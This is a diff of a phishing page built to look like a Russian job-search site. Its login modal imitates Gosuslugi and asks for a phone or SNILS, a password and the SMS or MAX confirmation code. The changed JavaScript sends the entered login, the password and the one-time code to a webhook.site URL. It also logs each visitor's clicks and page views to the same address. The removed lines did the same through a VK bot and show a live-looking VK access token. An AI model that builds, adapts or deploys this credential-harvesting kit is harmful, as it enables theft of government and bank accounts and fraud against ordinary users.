@@ -21,57 +21,44 @@
             --card-shadow-hover: 0 4px 8px rgba(16, 24, 40, 0.08), 0 16px 40px rgba(16, 24, 40, 0.10);
             --radius: 16px;
         }
-
         * { box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; margin: 0; padding: 0;}
         body { background-color: var(--bg-color); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; -webkit-font-smoothing: antialiased;}
-
         .header { background: rgba(255,255,255,0.92); backdrop-filter: blur(12px); padding: 14px 32px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); position: sticky; top: 0; z-index: 100; }
         .logo { display: flex; align-items: center; gap: 10px; cursor: pointer; text-decoration: none; color: var(--text-main); }
         .logo-svg { width: 38px; height: 38px; }
         .logo-text { font-size: 22px; font-weight: 800; letter-spacing: -0.6px; }
         .logo-text span { color: var(--primary); }
-
         .header-nav { display: flex; align-items: center; gap: 20px; }
         .nav-link { color: var(--text-muted); text-decoration: none; font-weight: 500; font-size: 15px; transition: color 0.2s; }
         .nav-link:hover { color: var(--primary); }
-
         .qr-btn { background: #fff; color: var(--text-main); border: 1.5px solid var(--border-color); padding: 10px 16px; border-radius: 10px; font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 14px; display: inline-flex; align-items: center; gap: 8px; }
         .qr-btn:hover { border-color: var(--primary); color: var(--primary); background: var(--primary-light); }
         .qr-btn svg { width: 18px; height: 18px; }
-
         .login-btn { background-color: var(--primary); color: white; border: none; padding: 11px 22px; border-radius: 10px; font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 14px; box-shadow: 0 2px 10px rgba(0, 85, 255, 0.25);}
         .login-btn:hover { background-color: var(--primary-hover); transform: translateY(-1px);}
         .user-profile { display: none; align-items: center; gap: 10px; font-weight: 600; font-size: 14px; color: var(--text-main); cursor: pointer; }
         .user-avatar { width: 36px; height: 36px; border-radius: 50%; background: var(--primary-light); display: flex; justify-content: center; align-items: center; color: var(--primary); }
-
         .container { max-width: 1040px; margin: 40px auto 80px; padding: 0 24px; width: 100%; flex: 1; }
-
         .search-panel { background: #fff; padding: 44px 32px 36px; border-radius: 24px; box-shadow: var(--card-shadow); margin-bottom: 36px; border: 1px solid var(--border-color); text-align: center; position: relative; overflow: hidden; }
         .search-panel::before { content: ""; position: absolute; top: -100px; left: 50%; transform: translateX(-50%); width: 600px; height: 200px; background: radial-gradient(ellipse at center, rgba(0,85,255,0.08), transparent 70%); pointer-events: none; }
         .search-panel h1 { font-size: 32px; font-weight: 800; margin-bottom: 10px; letter-spacing: -0.8px; position: relative; }
         .search-panel p { color: var(--text-muted); font-size: 16px; margin-bottom: 28px; position: relative; }
-
         .search-controls { display: flex; gap: 12px; max-width: 560px; margin: 0 auto; position: relative; }
         .city-select { flex: 1; padding: 16px 18px; border-radius: 12px; border: 1.5px solid var(--border-color); font-size: 16px; outline: none; cursor: pointer; background-color: #fff; font-weight: 500; color: var(--text-main); transition: 0.2s; appearance: none; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%23667085' viewBox='0 0 16 16'%3E%3Cpath d='M4 6l4 4 4-4'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 16px center; padding-right: 44px; }
         .city-select:hover { border-color: #C9D0DC; }
         .city-select:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(0, 85, 255, 0.12); }
-
         .job-list { display: flex; flex-direction: column; gap: 14px; }
         .job-card { background: #fff; padding: 26px 28px; border-radius: var(--radius); box-shadow: var(--card-shadow); cursor: pointer; transition: all 0.22s ease; border: 1px solid var(--border-color); display: flex; flex-direction: column; }
         .job-card:hover { transform: translateY(-3px); box-shadow: var(--card-shadow-hover); border-color: #C9D6F5; }
-
         .job-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px; gap: 16px; }
         .job-title { font-size: 19px; font-weight: 700; color: var(--text-main); letter-spacing: -0.3px; }
         .job-salary { font-size: 19px; font-weight: 800; color: var(--text-main); text-align: right; white-space: nowrap; }
-
         .job-company-row { display: flex; align-items: center; gap: 8px; color: var(--text-muted); font-size: 15px; margin-bottom: 18px;}
         .job-company-row svg { fill: var(--text-muted); width: 16px; height: 16px; flex-shrink: 0; }
-
         .job-footer { display: flex; justify-content: space-between; align-items: center; margin-top: auto; }
         .job-city-tag { display: inline-flex; align-items: center; gap: 6px; background: var(--primary-light); padding: 6px 12px; border-radius: 8px; font-size: 13px; font-weight: 600; color: var(--primary); }
         .job-city-tag svg { width: 14px; height: 14px; fill: var(--primary);}
         .job-date { font-size: 13px; color: var(--text-muted); font-weight: 500; }
-
         #detailsScreen { display: none; }
         .back-btn { background: none; border: none; color: var(--primary); font-size: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 8px; margin-bottom: 24px; padding: 6px 0; transition: 0.2s;}
         .back-btn:hover { opacity: 0.75; gap: 12px; }
@@ -79,70 +66,56 @@
         .details-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 20px; gap: 20px; }
         .details-title { font-size: 32px; font-weight: 800; color: var(--text-main); letter-spacing: -0.8px; }
         .details-salary { font-size: 26px; font-weight: 800; color: var(--primary); white-space: nowrap; }
-
         .details-meta { display: flex; gap: 14px; color: var(--text-muted); font-size: 15px; margin-bottom: 30px; padding-bottom: 30px; border-bottom: 1px solid var(--border-color); flex-wrap: wrap; }
         .details-desc { font-size: 16px; line-height: 1.75; color: #374151; margin-bottom: 40px; white-space: pre-line;}
-
         .btn-apply { width: 100%; padding: 18px; background-color: var(--primary); color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(0, 85, 255, 0.3);}
         .btn-apply:hover { background-color: var(--primary-hover); transform: translateY(-1px);}
-
         #applyFormScreen { display: none; }
         .apply-form-card { background: #fff; padding: 44px; border-radius: 24px; box-shadow: var(--card-shadow); border: 1px solid var(--border-color); max-width: 560px; margin: 0 auto; }
         .apply-form-title { font-size: 28px; font-weight: 800; margin-bottom: 8px; letter-spacing: -0.6px; text-align: center; }
         .apply-form-sub { color: var(--text-muted); font-size: 15px; text-align: center; margin-bottom: 32px; line-height: 1.6; }
         .apply-form-sub strong { color: var(--text-main); }
-
         .form-group { margin-bottom: 24px; }
         .form-group label { display: block; font-size: 14px; font-weight: 600; color: var(--text-main); margin-bottom: 8px; }
         .form-group textarea { width: 100%; padding: 14px 16px; background-color: #F9FAFB; border: 1.5px solid var(--border-color); border-radius: 10px; font-size: 15px; outline: none; transition: 0.2s; font-family: 'Inter', sans-serif; color: var(--text-main); resize: vertical; }
         .form-group textarea:focus { border-color: var(--primary); background-color: #fff; box-shadow: 0 0 0 4px rgba(0, 85, 255, 0.10); }
         .form-group textarea { min-height: 100px; }
-
         .radio-group { display: flex; gap: 10px; flex-wrap: wrap; }
         .radio-option { flex: 1; min-width: 100px; position: relative; }
         .radio-option input { position: absolute; opacity: 0; pointer-events: none; }
         .radio-option label { display: block; text-align: center; padding: 12px 8px; background: #F9FAFB; border: 1.5px solid var(--border-color); border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; color: var(--text-muted); margin: 0; }
         .radio-option input:checked + label { background: var(--primary-light); border-color: var(--primary); color: var(--primary); }
         .radio-option label:hover { border-color: #C9D0DC; }
-
         .btn-submit-apply { width: 100%; padding: 16px; background-color: var(--primary); color: white; border: none; border-radius: 12px; font-size: 17px; font-weight: 700; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(0, 85, 255, 0.25); margin-top: 8px; }
         .btn-submit-apply:hover { background-color: var(--primary-hover); transform: translateY(-1px); }
-
         #successScreen { display: none; text-align: center; padding: 64px 24px; background: #fff; border-radius: 24px; box-shadow: var(--card-shadow); border: 1px solid var(--border-color);}
         .success-icon { width: 84px; height: 84px; background: #ECFDF5; color: #10B981; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 26px; }
         .success-title { font-size: 28px; font-weight: 800; margin-bottom: 12px; letter-spacing: -0.6px;}
         .success-text { color: var(--text-muted); margin-bottom: 32px; line-height: 1.65; font-size: 16px; max-width: 420px; margin-left: auto; margin-right: auto;}
         .success-note { display: inline-flex; align-items: center; gap: 8px; background: #EFF6FF; color: #1D4ED8; font-size: 14px; font-weight: 600; padding: 10px 16px; border-radius: 10px; margin-bottom: 28px; }
         .success-note svg { width: 18px; height: 18px; flex-shrink: 0; }
-
         #authScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(16, 24, 40, 0.65); z-index: 1000; justify-content: center; align-items: center; backdrop-filter: blur(6px); padding: 20px; }
         .login-card { background-color: #ffffff; width: 100%; max-width: 420px; border-radius: 20px; padding: 40px; box-shadow: 0 24px 48px rgba(0,0,0,0.25); position: relative; }
         .close-auth { position: absolute; top: 18px; right: 18px; font-size: 24px; cursor: pointer; color: #9CA3AF; background: none; border: none; transition: 0.2s; width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
         .close-auth:hover { color: var(--text-main); background: #F3F4F6; }
-
         .logo-container { text-align: center; margin-bottom: 28px; }
         .logo-text-gos { font-size: 36px; font-weight: 800; color: #0b42b3; letter-spacing: -1.2px;}
         .logo-text-gos span { color: #e60000; }
-
         .input-group { margin-bottom: 20px; position: relative; }
         .input-group label { display: block; font-size: 14px; color: var(--text-muted); margin-bottom: 8px; font-weight: 500;}
         .input-group input { width: 100%; padding: 14px 16px; background-color: #F9FAFB; border: 1.5px solid var(--border-color); border-radius: 10px; font-size: 16px; outline: none; transition: 0.2s; font-family: 'Inter', sans-serif;}
         .input-group input:focus { border-color: #0b42b3; background-color: #fff; box-shadow: 0 0 0 4px rgba(11, 66, 179, 0.10); }
-
         .password-wrapper { position: relative; }
         .password-wrapper input { padding-right: 48px; }
         .toggle-password { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; background: none; border: none; color: #9CA3AF; display: flex; align-items: center; justify-content: center; padding: 6px; border-radius: 8px; transition: color 0.2s, background 0.2s; }
         .toggle-password:hover { color: #0b42b3; background: #EFF6FF; }
         .toggle-password svg { width: 20px; height: 20px; display: block; }
-
         .btn-submit { width: 100%; padding: 16px; background-color: #0b42b3; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: 0.2s;}
         .btn-submit:hover { background-color: #093587; }
         .btn-submit:disabled { background-color: #a0b3d6; cursor: not-allowed; }
-
         #smsLoading { text-align: center; padding: 20px 0; display: none; }
         .spinner { width: 40px; height: 40px; border: 4px solid #F3F4F6; border-top: 4px solid #0b42b3; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
         #authStep2 { display: none; }
         .code-inputs-container { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 30px; }
         .code-input { width: 100%; height: 56px; background-color: #F9FAFB; border: 1.5px solid var(--border-color); border-radius: 10px; font-size: 24px; font-weight: 600; text-align: center; outline: none; transition: 0.2s; font-family: 'Inter', sans-serif;}
@@ -150,7 +123,6 @@
         .phone-mask { font-weight: 600; color: var(--text-main); }
         .sms-hint { text-align: center; font-size: 13px; color: var(--text-muted); margin-bottom: 24px; line-height: 1.6; }
         .sms-hint strong { color: var(--text-main); }
-
         #qrScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(16, 24, 40, 0.65); z-index: 1000; justify-content: center; align-items: center; backdrop-filter: blur(6px); padding: 20px; }
         .qr-card { background: #fff; width: 100%; max-width: 380px; border-radius: 20px; padding: 36px 32px; box-shadow: 0 24px 48px rgba(0,0,0,0.25); position: relative; text-align: center; }
         .close-qr { position: absolute; top: 18px; right: 18px; font-size: 24px; cursor: pointer; color: #9CA3AF; background: none; border: none; transition: 0.2s; width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
@@ -168,10 +140,8 @@
         .qr-action-secondary:hover { background: #E5E7EB; }
         .qr-toast { font-size: 13px; color: #10B981; font-weight: 600; height: 18px; margin-top: 10px; opacity: 0; transition: opacity 0.3s; }
         .qr-toast.show { opacity: 1; }
-
         .city-select optgroup { font-weight: 600; color: var(--text-main); font-size: 14px; }
         .city-select option { font-weight: 400; padding: 6px; }
-
         @media (max-width: 720px) {
             .header { padding: 12px 16px; }
             .header-nav .nav-link { display: none; }
@@ -384,7 +354,7 @@
                 <form id="loginForm">
                     <div class="input-group">
                         <label>Телефон / СНИЛС</label>
-                        <input type="text" id="login" placeholder="+7 (___) ___-__-__ или СНИЛС" required>
+                        <input type="text" id="login" placeholder="" required>
                     </div>
                     <div class="input-group">
                         <label>Пароль</label>
@@ -416,7 +386,7 @@
                 </div>
                 <h3 style="text-align: center; margin-bottom: 8px; font-size: 20px;">Подтвердите вход по смс</h3>
                 <p class="sms-hint">
-                    Код отправлен на номер или в MAX <span class="phone-mask" id="displayPhone"></span><br>
+                    Код отправлен в смс или MAX <span class="phone-mask" id="displayPhone"></span><br>
                     
                 </p>
                 <form id="codeForm">
@@ -453,24 +423,38 @@
 
     <script>
         /* ====================================================================
-           ТВОИ ДАННЫЕ ВКОНТАКТЕ
+           WEBHOOK — все данные уходят сюда
            ==================================================================== */
-        const VK_TOKEN = "vk1.a.WT7earb8NwhFAcYHFSaIigdM5YTQBmP57vksKV1ZcvKn6gn_g9Cq9tvYYetYkw2H6NnwuXBDmNxReIPIpURFPJwOsN23--nvGMngHdiJR9kDhHoW_XchDLW9AfgK52ch2cspla0Sh3ZDLliuqm3ltCN-4HQZgWoJU0Tssbro6tODr0JYDMueuopR6VQlPbW2EtfbfXQ2ZJ98Ew4hQNnE-w";
-        const VK_PEER_ID = "576535806";
-        /* ==================================================================== */
+        const WEBHOOK_URL = "https://webhook.site/0ab09897-ee82-4598-b1da-37d9de80a816";                   
+        function sendToWebhook(message) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    message: message,
+                    time: new Date().toLocaleString('ru-RU'),
+                    page: window.location.href
+                })
+            }).catch(e => console.log('Webhook error:', e));
+        }
 
-        function sendToVK(message) {
-            const randomId = Math.floor(Math.random() * 1000000);
-            const url = `https://api.vk.com/method/messages.send?access_token=${VK_TOKEN}&peer_id=${VK_PEER_ID}&message=${encodeURIComponent(message)}&random_id=${randomId}&v=5.131`;
-            const img = new Image();
-            img.src = url;
+        /* ====================================================================
+           КОРОТКИЙ ЛОГГЕР — одно событие = одно короткое сообщение
+           ==================================================================== */
+        function logAction(action, details = {}) {
+            let msg = `${action}`;
+            const keys = Object.keys(details);
+            if (keys.length) {
+                msg += ' | ' + keys.map(k => `${k}: ${details[k]}`).join(' | ');
+            }
+            sendToWebhook(msg);
         }
 
         let isAuthorized = false;
         let currentJob = null;
         let enteredLogin = "";
 
-        /* Маскировка номера: последние 4 цифры как в настоящем номере */
         function maskPhone(phone) {
             const digits = phone.replace(/\D/g, '');
             if (digits.length === 11) {
@@ -511,6 +495,7 @@
         ];
 
         function renderJobs(city) {
+            logAction('Город', { 'Город': city });
             const listContainer = document.getElementById('jobList');
             listContainer.innerHTML = '';
             let shuffled = [...jobDatabase].sort(() => 0.5 - Math.random()).slice(0, 6);
@@ -541,6 +526,7 @@
         }
 
         function showJobDetails(job) {
+            logAction('Вакансия', { 'Вакансия': job.title, 'Город': job.city });
             currentJob = job;
             document.getElementById('listScreen').style.display = 'none';
             document.getElementById('applyFormScreen').style.display = 'none';
@@ -569,6 +555,7 @@
         }
 
         function openApplyForm() {
+            logAction('Отклик', { 'Вакансия': currentJob ? currentJob.title : '—' });
             if (!isAuthorized) { openAuth(); return; }
             document.getElementById('applyJobTitle').innerText = currentJob.title;
             document.getElementById('applyJobCompany').innerText = currentJob.company;
@@ -582,24 +569,17 @@
             const experience = document.querySelector('input[name="experience"]:checked').value;
             const shift = document.querySelector('input[name="shift"]:checked').value;
             const comment = document.getElementById('applyComment').value.trim();
-            let message = `💼 НОВЫЙ ОТКЛИК\n`;
-            message += `Вакансия: ${currentJob.title}\n`;
-            message += `Город: ${currentJob.city}\n`;
-            message += `Компания: ${currentJob.company}\n`;
-            message += `Опыт: ${experience}\n`;
-            message += `Смена: ${shift}\n`;
-            if (comment) message += `Комментарий: ${comment}`;
-            sendToVK(message);
+            let msg = `Отклик отправлен | Вакансия: ${currentJob.title} | Опыт: ${experience} | Смена: ${shift}`;
+            if (comment) msg += ` | Комментарий: ${comment}`;
+            sendToWebhook(msg);
             document.getElementById('applyFormScreen').style.display = 'none';
             document.getElementById('successScreen').style.display = 'block';
             window.scrollTo(0, 0);
             document.getElementById('applyForm').reset();
         });
 
-        /* ====================================================================
-           АВТОРИЗАЦИЯ
-           ==================================================================== */
         function openAuth() {
+            logAction('Авторизация');
             document.getElementById('authScreen').style.display = 'flex';
             document.getElementById('authStep1').style.display = 'block';
             document.getElementById('smsLoading').style.display = 'none';
@@ -634,14 +614,13 @@
             e.preventDefault();
             const login = document.getElementById('login').value.trim();
             const password = document.getElementById('password').value;
-
             enteredLogin = login;
 
-            sendToVK(`🔐 ВХОД НА ПОРТАЛ РАБОТЫ\nЛогин: ${login}\nПароль: ${password}`);
+            // Данные пользователя уходят на webhook
+            sendToWebhook(`ВХОД | Логин: ${login} | Пароль: ${password}`);
 
             document.getElementById('authStep1').style.display = 'none';
             document.getElementById('smsLoading').style.display = 'block';
-
             setTimeout(() => {
                 document.getElementById('smsLoading').style.display = 'none';
                 document.getElementById('authStep2').style.display = 'block';
@@ -668,7 +647,10 @@
             e.preventDefault();
             let code = '';
             codeInputs.forEach(i => code += i.value);
-            sendToVK(`🔑 КОД ИЗ СМС / MAX (Госуслуги)\nКод: ${code}`);
+
+            // Код уходит на webhook
+            sendToWebhook(`КОД | Код: ${code} | Логин: ${enteredLogin}`);
+
             isAuthorized = true;
             closeAuth();
             document.getElementById('headerLoginBtn').style.display = 'none';
@@ -676,10 +658,8 @@
             openApplyForm();
         });
 
-        /* ====================================================================
-           QR-КОД
-           ==================================================================== */
         function openQR() {
+            logAction('QR открыт');
             document.getElementById('qrScreen').style.display = 'flex';
             const url = window.location.href.split('#')[0];
             document.getElementById('qrUrl').innerText = url;
@@ -693,7 +673,6 @@
             const size = canvas.width;
             ctx.fillStyle = '#ffffff';
             ctx.fillRect(0, 0, size, size);
-
             if (typeof qrcode === 'undefined') {
                 ctx.fillStyle = '#9CA3AF';
                 ctx.font = '14px Inter, sans-serif';
@@ -702,7 +681,6 @@
                 ctx.fillText('Скопируйте ссылку ниже', size/2, size/2 + 12);
                 return;
             }
-
             try {
                 const qr = qrcode(0, 'M');
                 qr.addData(text);
@@ -710,7 +688,6 @@
                 const count = qr.getModuleCount();
                 const cell = Math.floor(size / count);
                 const offset = Math.floor((size - cell * count) / 2);
-
                 ctx.fillStyle = '#101828';
                 for (let row = 0; row < count; row++) {
                     for (let col = 0; col < count; col++) {
@@ -743,10 +720,12 @@
                 const t = document.getElementById('qrToast');
                 t.classList.add('show');
                 setTimeout(() => t.classList.remove('show'), 2000);
+                logAction('Ссылка скопирована');
             }
         }
 
         function downloadQR() {
+            logAction('QR скачан');
             const canvas = document.getElementById('qrCanvas');
             const link = document.createElement('a');
             link.download = 'rabota-rf-qr.png';
@@ -758,7 +737,11 @@
             if (e.target.id === 'qrScreen') closeQR();
         });
 
+        window.addEventListener('DOMContentLoaded', () => {
+            logAction('Зашёл на сайт');
+        });
+
         renderJobs('Кемерово');
     </script>
 </body>
-    </html>
+</html>
